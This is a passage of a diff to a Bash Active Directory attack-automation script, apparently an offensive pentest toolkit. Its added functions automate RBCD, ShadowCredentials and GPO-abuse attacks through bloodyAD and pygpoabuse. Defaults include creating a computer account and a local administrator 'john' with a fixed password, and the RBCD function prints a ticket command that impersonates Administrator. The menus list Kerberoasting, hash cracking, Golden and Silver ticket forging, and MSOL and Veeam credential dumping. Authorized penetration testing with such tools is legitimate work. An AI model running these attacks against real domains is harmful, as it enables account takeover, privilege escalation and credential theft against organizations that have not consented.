+            echo -e "${PURPLE}[-] bloodyad does not support kerberos authentication using AES Key${NC}"            
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
+            echo -e "${BLUE}[*] Adding new computer account. Please specify computer hostname (default: WS3000):${NC}"
+            read -p ">> " host_addcomp </dev/tty
+            if [[ ${host_addcomp} == "" ]]; then host_addcomp="WS3000"; fi
+            echo -e "${BLUE}[*] Please specify new password (default: Summer3000_):${NC}"
+            read -p ">> " pass_addcomp </dev/tty
+            if [[ ${pass_addcomp} == "" ]]; then pass_addcomp="Summer3000_"; fi
+            echo -e "${CYAN}[*] Creating computer ${host_addcomp} with password ${pass_addcomp}${NC}"
+            echo "$(date +%Y-%m-%d\ %H:%M:%S); ${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add computer \"${host_addcomp}\" \"${pass_addcomp}\"" >> $command_log
+            ${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add computer "${host_addcomp}" "${pass_addcomp}" | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_addcomp_${dc_domain}.txt 
+       fi
+    fi
+    echo -e ""
+}
+
+rbcd_attack () {
+    if [ ! -f "${bloodyad}" ] ; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
+    else
+        mkdir -p ${output_dir}/Modification/bloodyAD
+        if [ "${aeskey_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] bloodyad does not support kerberos authentication using AES Key${NC}"            
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
+            echo -e "${BLUE}[*] Performing RBCD attack: impersonate users on target via S4U2Proxy. Please specify target:${NC}"
+            target_rbcd=""
+            read -p ">> " target_rbcd </dev/tty
+            while [ "${target_rbcd}" == "" ] ; do
+                echo -e "${RED}Invalid name.${NC} Please specify target:"
+                read -p ">> " target_rbcd </dev/tty
+            done
+            echo -e "${BLUE}[*] Please specify account under your control:${NC}"
+            service_rbcd=""
+            read -p ">> " service_rbcd </dev/tty
+            while [ "${service_rbcd}" == "" ] ; do
+                echo -e "${RED}Invalid name.${NC} Please specify account under your control:"
+                read -p ">> " service_rbcd </dev/tty
+            done
+            echo -e "${CYAN}[*] Performing RBCD attack against ${target_rbcd} using account ${service_rbcd}${NC}"
+            echo "$(date +%Y-%m-%d\ %H:%M:%S); ${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add rbcd \"${target_rbcd}$\" \"${service_rbcd}$\"" >> $command_log
+            ${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add rbcd "${target_rbcd}$" "${service_rbcd}$" | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_rbcd_${dc_domain}.txt 
+            if [[ $(grep "can now impersonate users" ${output_dir}/Modification/bloodyAD/bloodyad_out_rbcd_${dc_domain}.txt 2>/dev/null) ]]; then
+                echo -e "${GREEN}[+] RBCD Attack successful! Run command below to generate ticket${NC}"
+                echo -e "getST.py -spn 'cifs/${target_rbcd}.${domain}' -impersonate Administrator -dc-ip ${dc_ip} '${domain}/${service_rbcd}$:PASSWORD'"
+                echo -e "${CYAN}[!] Run command below to remove impersonation rights:${NC}"
+                echo -e "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} remove rbcd '${target_rbcd}$' '${service_rbcd}$'"
+            fi
+       fi
+    fi
+    echo -e ""
+}
+
+shadowcreds_attack () {
+    if [ ! -f "${bloodyad}" ] ; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
+    else
+        mkdir -p ${output_dir}/Modification/bloodyAD
+        if [ "${aeskey_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] bloodyad does not support kerberos authentication using AES Key${NC}"            
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
+            echo -e "${BLUE}[*] Performing ShadowCredentials attack: Create and assign Key Credentials to target. Please specify target:${NC}"
+            target_shadowcreds=""
+            read -p ">> " target_shadowcreds </dev/tty
+            while [ "${target_shadowcreds}" == "" ] ; do
+                echo -e "${RED}Invalid name.${NC} Please specify target:"
+                read -p ">> " target_shadowcreds </dev/tty
+            done
+            echo -e "${CYAN}[*] Performing ShadowCredentials attack against ${target_shadowcreds}${NC}"
+            echo "$(date +%Y-%m-%d\ %H:%M:%S); ${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add shadowCredentials \"${target_shadowcreds}$\" --path ${output_dir}/Credentials/shadowcreds_${target_shadowcreds}" >> $command_log
+            ${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add shadowCredentials "${target_shadowcreds}$" --path "${output_dir}/Credentials/shadowcreds_${target_shadowcreds}"| tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_shadowcreds_${dc_domain}.txt 
+       fi
+    fi
+    echo -e ""
+}
+
+raise_child () {
+    if [ ! -f "${impacket_raiseChild}" ]; then
+        echo -e "${RED}[-] raiseChild.py not found! Please verify the installation of impacket ${NC}"
+    elif [ "${nullsess_bool}" == true ]; then
+        echo -e "${PURPLE}[-] raiseChild requires credentials${NC}"
+    else
+        echo -e "${BLUE}[*] Running privilege escalation from Child Domain to Parent Domain using raiseChild${NC}"
+        run_command "${impacket_rpcdump} ${argument_imp} -w ${output_dir}/Credentials/raiseChild_ccache_${domain}.txt" 2>&1 | tee -a ${output_dir}/Modification/impacket_raiseChild_output.txt
+    fi
+    echo -e ""
+}
+
+pygpo_abuse () {
+    if [ ! -f "${pygpoabuse}" ]; then
+        echo -e "${RED}[-] Please verify the installation of pygpoabuse${NC}"
+    elif [ "${nullsess_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
+        echo -e "${PURPLE}[-] pygpoabuse requires credentials and does not support kerberos authentication using AES Key${NC}"
+    else
+        echo -e "${BLUE}[*] Using modification rights on GPO to execute command. Please specify GPO ID${NC}"
+        target_gpoabuse=""
+        read -p ">> " target_gpoabuse </dev/tty
+        while [ "${target_gpoabuse}" == "" ] ; do
+            echo -e "${RED}Invalid ID.${NC} Please specify GPO ID:"
+            read -p ">> " target_gpoabuse </dev/tty
+        done
+        userbool_gpoabuse=""
+        echo -e "${BLUE}[*] Please type 'user' if you wish to set user GPO. Press enter to set computer GPO${NC}"
+        read -p ">> " target_userbool </dev/tty
+        if [ "${target_userbool}" == "user" ] ; then
+            echo -e "${YELLOW}[!] User GPO chosen!${NC}"
+            userbool_gpoabuse="-user"
+        fi
+        command_gpoabuse=""
+        echo -e "${BLUE}[*] Please specify command to execute. Press enter to use default: create user john with password 'H4x00r123..' as local administrator${NC}"
+        read -p ">> " command_input_gpoabuse </dev/tty
+        if [ ! "${command_input_gpoabuse}" == "" ] ; then command_gpoabuse="-command ${command_input_gpoabuse}"; fi
+        if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi            
+        run_command "$(which python) ${pygpoabuse} ${argument_pygpoabuse} ${ldaps_param} -dc-ip ${dc_ip} -gpo-id ${target_gpoabuse} ${userbool_gpoabuse} ${command_gpoabuse}" 2>&1 | tee -a ${output_dir}/Modification/pygpoabuse_output.txt
+    fi
+    echo -e ""
+}
+
+###### pwd_dump: Password Dump
 juicycreds_dump () {
     echo -e "${BLUE}[*] Search for juicy credentials: Firefox, KeePass, Rdcman, Teams, WiFi, WinScp${NC}"
     if [ "${kerb_bool}" == true ]; then
@@ -1941,30 +2275,6 @@ juicycreds_dump () {
         run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M wifi --log ${output_dir}/Credentials/wifi_${dc_domain}_${i}.txt" 2>&1
         run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M winscp --log ${output_dir}/Credentials/winscp_${dc_domain}_${i}.txt" 2>&1
     done
-    echo -e ""
-}
-
-msol_dump () {
-    echo -e "${BLUE}[*] MSOL password dump${NC}"
-    target_msol=""
-    read -p ">> " target_msol </dev/tty
-    while [ ! -s "${target_msol}" ] ; do
-        echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
-        read -p ">> " target_msol </dev/tty
-    done
-    run_command "${netexec} ${ne_verbose} smb ${target_msol} ${argument_ne} -M msol --log ${output_dir}/Credentials/msol_${dc_domain}_${i}.txt" 2>&1
-    echo -e ""
-}
-
-veeam_dump () {
-    echo -e "${BLUE}[*] Veeam credentials Dump${NC}"
-    target_veeam=""
-    read -p ">> " target_veeam </dev/tty
-    while [ ! -s "${target_veeam}" ] ; do
-        echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
-        read -p ">> " target_veeam </dev/tty
-    done
-    run_command "${netexec} ${ne_verbose} smb ${target_veeam} ${argument_ne} -M veeam --log ${output_dir}/Credentials/veeam_${dc_domain}_${i}.txt" 2>&1
     echo -e ""
 }
 
@@ -2268,6 +2578,30 @@ bitlocker_dump () {
     echo -e ""
 }
 
+msol_dump () {
+    echo -e "${BLUE}[*] MSOL password dump. Please specify IP or hostname of Azure AD-Connect server:${NC}"
+    target_msol=""
+    read -p ">> " target_msol </dev/tty
+    while [ "${target_msol}" == "" ] ; do
+        echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
+        read -p ">> " target_msol </dev/tty
+    done
+    run_command "${netexec} ${ne_verbose} smb ${target_msol} ${argument_ne} -M msol --log ${output_dir}/Credentials/msol_${dc_domain}_${i}.txt" 2>&1
+    echo -e ""
+}
+
+veeam_dump () {
+    echo -e "${BLUE}[*] Veeam credentials dump. Please specify IP or hostname of Veeam server:${NC}"
+    target_veeam=""
+    read -p ">> " target_veeam </dev/tty
+    while [ "${target_veeam}" == "" ] ; do
+        echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
+        read -p ">> " target_veeam </dev/tty
+    done
+    run_command "${netexec} ${ne_verbose} smb ${target_veeam} ${argument_ne} -M veeam --log ${output_dir}/Credentials/veeam_${dc_domain}_${i}.txt" 2>&1
+    echo -e ""
+}
+
 get_hash (){
     if [ ! -f "${impacket_secretsdump}" ] ; then
         echo -e "${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}"
@@ -2290,120 +2624,44 @@ get_hash (){
     echo -e ""
 }
 
-###### LDAP Console Tools
-certipy_ldapshell () {
-    if [[ ! -f "${certipy}" ]] ; then
-        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
-    else
-        if [ "${cert_bool}" == true ] ; then
-            echo -e "${BLUE}[*] Launching LDAP shell via Schannel using Certipy ${NC}"
-            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
-            run_command "${certipy} auth -pfx ${pfxcert} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param}" -ldap-shell 2>&1 | tee ${output_dir}/ConsoleData/certipy_ldapshell_output_${dc_domain}.txt
-        else
-            echo -e "${PURPLE}[-] Certificate authentication required to open LDAP shell using Certipy${NC}"
-        fi
-    fi
-    echo -e ""
-}
-
-ldap_console () {
-    if [ ! -f "${FindUncommonShares}" ]; then
-        echo -e "${RED}[-] Please verify the installation of ldapconsole${NC}"
-    else
-        echo -e "${BLUE}[*] Launching ldapconsole${NC}"
-        if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
-        if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-debug"; else verbose_p0dalirius=""; fi
-        run_command "${ldapconsole} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --kdcHost ${dc_FQDN}" 2>&1 | tee -a ${output_dir}/ConsoleData/ldapconsole_output_${dc_domain}.txt
-    fi
-    echo -e ""
-}
-
-ldap_monitor () {
-    if [ ! -f "${pyLDAPmonitor}" ]; then
-        echo -e "${RED}[-] Please verify the installation of pyLDAPmonitor${NC}"
-    else
-        echo -e "${BLUE}[*] Launching pyLDAPmonitor${NC}"
-        if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
-        if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="--debug"; else verbose_p0dalirius=""; fi
-        run_command "${pyLDAPmonitor} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --kdcHost ${dc_FQDN}" 2>&1
-    fi
-    echo -e ""
-}
-
-aced_console (){
-    if [ ! -f "${aced}" ]; then
-        echo -e "${RED}[-] Please verify the installation of aced${NC}"
-    else
-        if [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] aced requires credentials${NC}"
-        else
-            echo -e "${BLUE}[*] Launching aced${NC}"
-            if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
-            run_command "$(which python) ${aced} ${argument_aced}@${dc_FQDN} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a ${output_dir}/ConsoleData/aced_output_${dc_domain}.txt
-        fi
-    fi
-    echo -e ""
-}
-
-ldapper_console (){
-    if [ ! -f "${ldapper}" ]; then
-        echo -e "${RED}[-] Please verify the installation of ldapper${NC}"
-    else
-        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] ldapper requires credentials and does not support kerberos authentication${NC}"
-        else
-            echo -e "${BLUE}[*] Running ldapper with custom LDAP search string${NC}"
-            if [ "${ldaps_bool}" == true ]; then ldaps_param="-n 1"; else ldaps_param="-n 2"; fi
-            echo -e "${CYAN}[*] Please choose an option or provide a custom LDAP search string ${NC}"
-            echo -e "1.1) Get specific user (You will be prompted for the username)"
-            echo -e "2.1) Get specific group (You will be prompted for the group name)"
-            echo -e "4.1) Get specific computer (You will be prompted for the computer name)"
-            echo -e "9.1) Search for specific User SPN (You will be prompted for the User Principle Name)"
-            echo -e "10.1) Search for specific Workstation LAPS Password (You will be prompted for the Workstation Name)"
-            echo -e "*) Run custom Query (e.g. (&(objectcategory=user)(serviceprincipalname=*))"
-            echo -e "back) Go back"
-
-            read -p "> " custom_option </dev/tty
-            if [[ ! ${custom_option} == "back" ]]; then
-                run_command "$(which python) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -s ${custom_option} | tee -a ${output_dir}/DomainRecon/LDAPPER/ldapper_console_output_${dc_domain}.txt
-            else
-                console_menu
-            fi
-            ldapper_console
-        fi
-    fi
-    echo -e ""
-}
-
 ad_enum () {
     bhd_enum
     ldapdomaindump_enum
     enum4linux_enum
+    ne_gpp
     ne_smb_enum
     ne_ldap_enum
-    deleg_enum_imp
-    certi_py_enum
-    certipy_enum
-    silenthound_enum
-    windapsearch_enum
-    ldeep_enum
-    ridbrute_attack
-    userpass_ne_check
-    pre2k_check
-    bloodyad_enum
+    deleg_enum
+    bloodyad_all_enum
+    bloodyad_write_enum
     ldapwordharv_enum
     rdwatool_enum
     sccm_enum
+    GPOwned_enum
+}
+
+adcs_enum () {
+    ne_adcs_enum
+    certi_py_enum
+    certipy_enum
+    certifried_check
+}
+
+bruteforce () {
+    ridbrute_attack
+    kerbrute_enum
+    userpass_kerbrute_check
+    pre2k_check 
 }
 
 kerberos () {
-    kerbrute_enum
-    userpass_kerbrute_check
     asrep_attack
     asreprc4_attack
     kerberoast_attack
     john_crack_asrep
     john_crack_kerberoast
+    nopac_check
+    ms14-068_check
 }
 
 scan_shares () {
@@ -2412,33 +2670,34 @@ scan_shares () {
     manspider_scan
 }
 
-pwd_dump () {
-    juicycreds_dump
-    laps_dump
-    gmsa_dump
-    secrets_dump
-    lsassy_dump
-    dpapi_dump
-    bitlocker_dump
-}
-
 vuln_checks () {
-    nopac_check
-    petitpotam_check
     zerologon_check
-    ms14-068_check
     ms17-010_check
+    petitpotam_check
+    dfscoerce_check
     spooler_check
     printnightmare_check
     webdav_check
-    dfscoerce_check
     shadowcoerce_check
     smbsigning_check
     ntlmv1_check
     runasppl_check
     rpcdump_check
-    coercer_check
-    certifried_check
+}
+
+mssql_checks () {
+    mssql_enum
+    mssql_relay_check
+}
+
+pwd_dump () {
+    juicycreds_dump
+    laps_dump
+    gmsa_dump
+    secrets_dump
+    nanodump_dump
+    dpapi_dump
+    bitlocker_dump
 }
 
 print_info () {
@@ -2446,7 +2705,6 @@ print_info () {
     echo -e "${YELLOW}[i]${NC} Domain Controller's FQDN: ${YELLOW}${dc_FQDN}${NC}"
     echo -e "${YELLOW}[i]${NC} Domain Controller's IP: ${YELLOW}${dc_ip}${NC}"
     echo -e "${YELLOW}[i]${NC} Domain Controller's ports: RPC ${dc_port_135}, SMB ${dc_port_445}, LDAP ${dc_port_389}, LDAPS ${dc_port_636}"
-    echo -e "${YELLOW}[i]${NC} Running modules: ${YELLOW}${modules}${NC}"
     echo -e "${YELLOW}[i]${NC} Output folder: ${YELLOW}${output_dir}${NC}"
     echo -e "${YELLOW}[i]${NC} User wordlist file: ${YELLOW}${user_wordlist}${NC}"
     echo -e "${YELLOW}[i]${NC} Password wordlist file: ${YELLOW}${pass_wordlist}${NC}"
@@ -2559,23 +2817,25 @@ ad_menu() {
     echo -e "2) BloodHound Enumeration using DCOnly"
     echo -e "3) ldapdomaindump LDAP Enumeration"
     echo -e "4) enum4linux-ng LDAP-MS-RPC Enumeration"
-    echo -e "5) MS-RPC Enumeration using netexec (Users, pass pol, GPP)"
-    echo -e "6) LDAP Enumeration using netexec (Users, passnotreq, ADCS, userdesc, maq, ldap-checker, deleg, subnets)"
-    echo -e "7) Delegation Enumeration using findDelegation"
-    echo -e "8) certi.py ADCS Enumeration"
-    echo -e "9) Certipy ADCS Enumeration"
-    echo -e "10) SilentHound LDAP Enumeration"
-    echo -e "11) windapsearch LDAP Enumeration"
+    echo -e "5) GPP Enumeration using netexec"
+    echo -e "6) MS-RPC Enumeration using netexec (Users, pass pol)"
+    echo -e "7) LDAP Enumeration using netexec (Users, passnotreq, userdesc, maq, ldap-checker, subnets)"
+    echo -e "8) Delegation Enumeration using findDelegation and netexec"
+    echo -e "9) bloodyAD All Enumeration"
+    echo -e "10) bloodyAD write rights Enumeration"
+    echo -e "11) SilentHound LDAP Enumeration"
     echo -e "12) ldeep LDAP Enumeration"
-    echo -e "13) RID Brute Force (Null session) using netexec"
-    echo -e "14) User=Pass check using netexec (Noisy!)"
-    echo -e "15) Pre2k computers authentication check (Noisy!)"
-    echo -e "16) bloodyAD Enumeration"
-    echo -e "17) LDAP Wordlist Harvester"
-    echo -e "18) Enumeration of RDWA servers"
-    echo -e "19) SCCM Enumeration using sccmhunter"
-    echo -e "20) LDAP Enumeration using LDAPPER"
-    echo -e "21) Adalanche Enumeration"
+    echo -e "13) windapsearch LDAP Enumeration"
+    echo -e "14) LDAP Wordlist Harvester"
+    echo -e "15) Enumeration of RDWA servers"
+    echo -e "16) SCCM Enumeration using sccmhunter"
+    echo -e "17) LDAP Enumeration using LDAPPER"
+    echo -e "18) Adalanche Enumeration"
+    echo -e "19) GPO Enumeration using GPOwned"
+    echo -e "20) Open p0dalirius' LDAP Console"
+    echo -e "21) Open p0dalirius' LDAP Monitor"
+    echo -e "22) Open garrettfoster13's ACED console"
+    echo -e "23) Open LDAPPER custom options"
     echo -e "back) Go back"
 
     read -p "> " option_selected </dev/tty
@@ -2583,109 +2843,205 @@ ad_menu() {
     case ${option_selected} in
         A)
         ad_enum
-        ad_menu
-        ;;
+        ad_menu;;
 
         1)
         bhd_enum
-        ad_menu
-        ;;
+        ad_menu;;
 
         2)
         bhd_enum_dconly
-        ad_menu
-        ;;
+        ad_menu;;
 
         3)
         ldapdomaindump_enum
-        ad_menu
-        ;;
+        ad_menu;;
 
         4)
         enum4linux_enum
-        ad_menu
-        ;;
+        ad_menu;;
 
         5)
-        ne_smb_enum
+        ne_gpp
         ad_menu;;
 
         6)
-        ne_ldap_enum
+        ne_smb_enum
         ad_menu;;
 
         7)
-        deleg_enum_imp
+        ne_ldap_enum
         ad_menu;;
 
         8)
-        certi_py_enum
+        deleg_enum
         ad_menu;;
 
         9)
-        certipy_enum
+        bloodyad_all_enum
         ad_menu;;
 
         10)
-        silenthound_enum
-        ad_menu
-        ;;
+        bloodyad_write_enum
+        ad_menu;;
 
         11)
-        windapsearch_enum
-        ad_menu
-        ;;
+        silenthound_enum
+        ad_menu;;
 
         12)
         ldeep_enum
-        ad_menu
-        ;;
-        
+        ad_menu;;
+
         13)
-        ridbrute_attack
+        windapsearch_enum
         ad_menu;;
 
         14)
-        userpass_ne_check
-        ad_menu;;
-
-        15)
-        pre2k_check
-        ad_menu;;
-
-        16)
-        bloodyad_enum
-        ad_menu;;
-
-        17)
         ldapwordharv_enum
         ad_menu;;
 
-        18)
+        15)
         rdwatool_enum
         ad_menu;;
 
-        19)
+        16)
         sccm_enum
         ad_menu;;
 
-        20)
+        17)
         ldapper_enum
         ad_menu;;
 
-        21)
+        18)
         adalanche_enum
         ad_menu;;
 
+        19)
+        GPOwned_enum
+        ad_menu;;
+
+        20)
+        ldap_console
+        ad_menu;;
+
+        21)
+        ldap_monitor
+        ad_menu;;
+
+        22)
+        aced_console
+        ad_menu;;
+
+        23)
+        ldapper_console
+        ad_menu;;
+
         back)
-        main_menu
-        ;;
+        main_menu;;
 
         *)
         echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
         echo -e ""
-        ad_menu
+        ad_menu;;
+    esac
+}
+
+adcs_menu() {
+    echo -e ""
+    echo -e "${CYAN}[ADCS menu]${NC} Please choose from the following options:"
+    echo -e "-----------------------------------------------------"
+    echo -e "A) ALL ADCS ENUMERATIONS"
+    echo -e "1) ADCS Enumeration using netexec"
+    echo -e "2) certi.py ADCS Enumeration"
+    echo -e "3) Certipy ADCS Enumeration"
+    echo -e "4) Certifried check"
+    echo -e "5) Certipy LDAP shell via Schannel (using Certificate Authentication)"
+    echo -e "back) Go back"
+
+    read -p "> " option_selected </dev/tty
+
+    case ${option_selected} in
+        A)
+        adcs_enum
+        adcs_menu;;
+        
+        1)
+        ne_adcs_enum
+        adcs_menu;;
+
+        2)
+        certi_py_enum
+        adcs_menu;;
+
+        3)
+        certipy_enum
+        adcs_menu;;
+
+        4)
+        certifried_check
+        adcs_menu
         ;;
+
+        5)
+        certipy_ldapshell
+        adcs_menu;;
+
+        back)
+        main_menu;;
+
+        *)
+        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
+        echo -e ""
+        adcs_menu;;
+    esac
+}
+
+bruteforce_menu() {
+    echo -e "${CYAN}[BruteForce menu]${NC} Please choose from the following options:"
+    echo -e "----------------------------------------------------------"
+    echo -e "A) ALL BRUTEFORCE ATTACKS"
+    echo -e "1) RID Brute Force (Null session) using netexec"
+    echo -e "2) User Enumeration using kerbrute (Null session)"
+    echo -e "3) User=Pass check using kerbrute (Noisy!)"
+    echo -e "4) User=Pass check using netexec (Noisy!)"
+    echo -e "5) Pre2k computers authentication check (Noisy!)"
+    echo -e "back) Go back"
+
+    read -p "> " option_selected </dev/tty
+
+    case ${option_selected} in
+        A)
+        bruteforce
+        bruteforce_menu;;
+
+        1)
+        ridbrute_attack
+        bruteforce_menu;;
+        
+        2)
+        kerbrute_enum
+        bruteforce_menu;;
+
+        3)
+        userpass_kerbrute_check
+        bruteforce_menu;;
+
+        4)
+        userpass_ne_check
+        bruteforce_menu;;
+
+        5)
+        pre2k_check
+        bruteforce_menu;;
+
+        back)
+        main_menu;;
+
+        *)
+        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
+        echo -e ""
+        bruteforce_menu;;
     esac
 }
 
@@ -2694,16 +3050,19 @@ kerberos_menu () {
     echo -e "${CYAN}[Kerberos Attacks menu]${NC} Please choose from the following options:"
     echo -e "-----------------------------------------------------------------"
     echo -e "A) ALL KERBEROS ATTACKS"
-    echo -e "1) User Enumeration using kerbrute (Null session)"
-    echo -e "2) User=Pass check using kerbrute (Noisy!)"
-    echo -e "3) AS REP Roasting Attack using GetNPUsers"
-    echo -e "4) CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)"
-    echo -e "5) Kerberoast Attack using GetUserSPNs"
-    echo -e "6) Targeted Kerberoast Attack (Noisy!)"
-    echo -e "7) Cracking AS REP Roast hashes using john the ripper"
-    echo -e "8) Cracking Kerberoast hashes using john the ripper"
-    echo -e "9) AP-REQ hijack with DNS unsecure updates abuse using krbjack"
-    echo -e "10) Run custom Kerberoast attack using Orpheus"
+    echo -e "1) AS REP Roasting Attack using GetNPUsers"
+    echo -e "2) Kerberoast Attack using GetUserSPNs"
+    echo -e "3) Cracking AS REP Roast hashes using john the ripper"
+    echo -e "4) Cracking Kerberoast hashes using john the ripper"
+    echo -e "5) NoPac check using netexec (only on DC)"
+    echo -e "6) MS14-068 check (only on DC)"
+    echo -e "7) CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)"
+    echo -e "8) AP-REQ hijack with DNS unsecure updates abuse using krbjack"
+    echo -e "9) Run custom Kerberoast attack using Orpheus"
+    echo -e "10) Generate Golden Ticket (requires: password or NTLM hash of Domain Admin)"
+    echo -e "11) Generate Silver Ticket (requires: password or NTLM hash of Domain Admin)"
+    echo -e "12) Generate Diamond Ticket (requires: password or NTLM hash of Domain Admin)"
+    echo -e "13) Generate Sapphire Ticket (requires: password or NTLM hash of Domain Admin)"
     echo -e "back) Go back"
 
     read -p "> " option_selected </dev/tty
@@ -2711,672 +3070,45 @@ kerberos_menu () {
     case ${option_selected} in
         A)
         kerberos
-        kerberos_menu
-        ;;
+        kerberos_menu;;
 
         1)
-        kerbrute_enum
-        kerberos_menu
-        ;;
-
-        2)
-        userpass_kerbrute_check
-        kerberos_menu
-        ;;
-
-        3)
         asrep_attack
-        kerberos_menu
-        ;;
+        kerberos_menu;;
 
-        4)
-        asreprc4_attack
-        kerberos_menu
-        ;;
-
-        5)
+        2)
         kerberoast_attack
-        kerberos_menu
-        ;;
+        kerberos_menu;;
 
-        6)
-        targetedkerberoast_attack
-        kerberos_menu
-        ;;
-
-        7)
+        3)
         john_crack_asrep
-        kerberos_menu
-        ;;
+        kerberos_menu;;
         
-        8)
+        4)
         john_crack_kerberoast
-        kerberos_menu
-        ;;
-
-        9)
-        krbjack_attack
-        kerberos_menu
-        ;;
-
-        10)
-        kerborpheus_attack
-        kerberos_menu
-        ;;
-
-        back)
-        main_menu
-        ;;
-
-        *)
-        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
-        echo -e ""
-        kerberos_menu
-        ;;
-    esac
-}
-
-shares_menu () {
-    echo -e ""
-    echo -e "${CYAN}[SMB Shares menu]${NC} Please choose from the following options:"
-    echo -e "-----------------------------------------------------------"
-    echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
-    echo -e "A) ALL SMB SHARES SCANS"
-    echo -e "m) Modify target(s)"
-    echo -e "1) SMB shares Scan using smbmap"
-    echo -e "2) SMB shares Enumeration using netexec"
-    echo -e "3) SMB shares Spidering using netexec "
-    echo -e "4) SMB shares Scan using FindUncommonShares"
-    echo -e "5) SMB shares Scan using manspider"
-    echo -e "back) Go back"
-
-    read -p "> " option_selected </dev/tty
-
-    case ${option_selected} in
-        A)
-        scan_shares
-        shares_menu
-        ;;
-
-        m)
-        modify_target
-        shares_menu
-        ;;
-
-        1)
-        smb_map
-        shares_menu
-        ;;
-
-        2)
-        ne_shares
-        shares_menu
-        ;;
-
-        3)
-        ne_spider
-        shares_menu
-        ;;
-
-        4)
-        finduncshar_scan
-        shares_menu
-        ;;
+        kerberos_menu;;
 
         5)
-        manspider_scan
-        shares_menu
-        ;;
-
-        back)
-        main_menu
-        ;;
-
-        *)
-        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
-        echo -e ""
-        shares_menu
-        ;;
-    esac
- 
-}
-
-vulns_menu () {
-    echo -e ""
-    echo -e "${CYAN}[Vuln Checks menu]${NC} Please choose from the following options:"
-    echo -e "------------------------------------------------------------"
-    echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
-    echo -e "A) ALL VULNERABILITY CHECKS"
-    echo -e "m) Modify target(s)"
-    echo -e "1) NoPac check using netexec (only on DC)"
-    echo -e "2) PetitPotam check using netexec (only on DC)"
-    echo -e "3) dfscoerce check using netexec (only on DC)"
-    echo -e "4) zerologon check using netexec (only on DC)"
-    echo -e "5) MS14-068 check (only on DC)"
-    echo -e "6) MS17-010 check using netexec"
-    echo -e "7) Print Spooler check using netexec"
-    echo -e "8) Printnightmare check using netexec"
-    echo -e "9) WebDAV check using netexec"
-    echo -e "10) shadowcoerce check using netexec"
-    echo -e "11) SMB signing check using netexec"
-    echo -e "12) ntlmv1 check using netexec"
-    echo -e "13) runasppl check using netexec"
-    echo -e "14) RPC Dump and check for interesting protocols"
-    echo -e "15) Coercer RPC scan"
-    echo -e "16) Certifried check"
-    echo -e "back) Go back"
-
-    read -p "> " option_selected </dev/tty
-
-    case ${option_selected} in
-        A)
-        vuln_checks
-        vulns_menu
-        ;;
-
-        m)
-        modify_target
-        vulns_menu
-        ;;
-        
-        1)
         nopac_check
-        vulns_menu
-        ;;
+        kerberos_menu;;
 
-        2)
-        petitpotam_check
-        vulns_menu
-        ;;
-
-        3)
-        dfscoerce_check
-        vulns_menu
-        ;;
-
-        4)
-        zerologon_check
-        vulns_menu
-        ;;
-
-        5)
+        6)
         ms14-068_check
-        vulns_menu
-        ;;
-        
-        6)
-        ms17-010_check
-        vulns_menu
-        ;;
+        kerberos_menu;;
 
         7)
-        spooler_check
-        vulns_menu
-        ;;
-        
-        8)
-        printnightmare_check
-        vulns_menu
-        ;;
-
-        9)
-        webdav_check
-        vulns_menu
-        ;;
-
-        10)
